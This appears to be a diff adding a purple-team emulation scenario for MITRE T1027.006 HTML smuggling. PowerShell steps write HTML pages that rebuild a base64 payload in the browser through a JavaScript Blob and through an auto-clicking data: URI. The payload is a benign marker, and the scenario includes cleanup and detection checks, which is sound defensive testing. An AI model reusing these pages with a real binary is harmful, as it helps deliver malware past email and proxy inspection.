@@ -1,0 +1,120 @@
+id: T1027.006_html_smuggling
+name: "Obfuscated Files or Information — HTML Smuggling"
+mitre_technique: "T1027.006"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries embed malicious payloads inside HTML files as JavaScript Blob objects or
+  Data URLs. When the HTML page is opened in a browser, JavaScript reconstructs the
+  binary and triggers an automatic download — bypassing network content inspection
+  because the payload is assembled client-side. Email gateways and web proxies that
+  inspect HTTP responses often miss this because only HTML arrives on the wire.
+  This scenario creates a functional HTML smuggling page using both the Blob and
+  msSaveBlob methods, delivering a benign test payload.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1027/006/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1027.006 — HTML Smuggling simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create an HTML smuggling page with embedded base64 payload and auto-download JS"
+    command: |
+      $htmlPath = "$env:TEMP\PAS_T1027_006_smuggle.html"
+
+      # Benign payload — "PAS-T1027-006-SMUGGLED\n" as base64
+      $payloadBytes  = [Text.Encoding]::UTF8.GetBytes("PAS-T1027-006-SMUGGLED-PAYLOAD`n")
+      $payloadB64    = [Convert]::ToBase64String($payloadBytes)
+
+      $html = @"
+<!DOCTYPE html>
+<html>
+<head><title>PAS T1027.006 HTML Smuggling Test</title></head>
+<body>
+<p>PAS HTML Smuggling Simulation</p>
+<script>
+// Technique 1: Blob + URL.createObjectURL (modern browsers)
+var b64 = "$payloadB64";
+var raw = atob(b64);
+var arr = new Uint8Array(raw.length);
+for (var i = 0; i < raw.length; i++) { arr[i] = raw.charCodeAt(i); }
+var blob = new Blob([arr], {type: 'application/octet-stream'});
+var url  = URL.createObjectURL(blob);
+var a    = document.createElement('a');
+a.href     = url;
+a.download = 'PAS_T1027_006_payload.txt';
+document.body.appendChild(a);
+
+// Technique 2: msSaveBlob (IE/Edge legacy)
+if (window.navigator && window.navigator.msSaveBlob) {
+    window.navigator.msSaveBlob(blob, 'PAS_T1027_006_payload.txt');
+}
+// Note: auto-click omitted — triggers download only on user interaction in this sim
+</script>
+</body>
+</html>
+"@
+      Set-Content $htmlPath $html
+      Write-Host "[PAS] HTML smuggling page created: $htmlPath"
+      Write-Host "[PAS] Contains: base64-encoded payload reconstructed via JavaScript Blob"
+      Write-Host "[PAS] Payload b64: $payloadB64"
+      Write-Host "[PAS] Detection: content inspection must decode JS to find embedded payload"
+
+  - step: 3
+    type: exec_powershell
+    description: "Demonstrate Data URL smuggling variant — inline binary in href"
+    command: |
+      $dataHtmlPath = "$env:TEMP\PAS_T1027_006_dataurl.html"
+      $payloadBytes = [Text.Encoding]::UTF8.GetBytes("PAS-T1027-006-DATAURL-PAYLOAD`n")
+      $payloadB64   = [Convert]::ToBase64String($payloadBytes)
+
+      $html2 = @"
+<!DOCTYPE html><html><body>
+<a id="dl" href="data:application/octet-stream;base64,$payloadB64"
+   download="PAS_dataurl_payload.txt">Download</a>
+<script>document.getElementById('dl').click();</script>
+</body></html>
+"@
+      Set-Content $dataHtmlPath $html2
+      Write-Host "[PAS] Data URL smuggling page created: $dataHtmlPath"
+      Write-Host "[PAS] Payload embedded directly as data: URI — no external request needed"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check: email gateway and proxy should be tested with these HTML files to validate smuggling detection"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove HTML smuggling test files"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1027_006_smuggle.html"  -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1027_006_dataurl.html"  -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] HTML smuggling files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1027.006 cleanup complete"
+
+analyst_checklist:
+  - "File event: .html file created in TEMP containing base64 blob and JavaScript Blob constructor"
+  - "Browser network event: download triggered from blob: URI or data: URI — no external HTTP request"
+  - "Sentinel: DeviceFileEvents | where FileName endswith '.html' and FolderPath contains 'Temp'"
+  - "MDE: Browser download events from blob: and data: URIs — check DeviceFileEvents for files downloaded from 'blob:' source"
+  - "CONTROL CHECK: Network inspection tools (proxy, Defender for Office 365) must decode HTML and inspect embedded JS Blobs"
+  - "CONTROL CHECK: Email gateway should detonate HTML attachments in sandbox — static scanning misses this technique"
+  - "CONTROL CHECK: Defender for Office 365 Safe Attachments sandboxes HTML files — verify policy covers .html attachments"
+  - "CONTROL CHECK: Test your gateway with both Blob and Data URL variants — detection rates differ between methods"
